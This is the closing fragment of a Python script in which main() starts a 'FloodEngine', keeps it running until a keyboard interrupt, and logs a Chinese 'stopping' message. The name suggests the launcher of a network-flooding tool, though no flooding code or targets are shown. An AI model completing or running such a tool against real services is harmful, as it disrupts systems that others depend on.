
    engine = FloodEngine(CONFIG, builder)
    engine.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print()
        log_info("正在停止...")
        engine.stop()


if __name__ == "__main__":
    main()
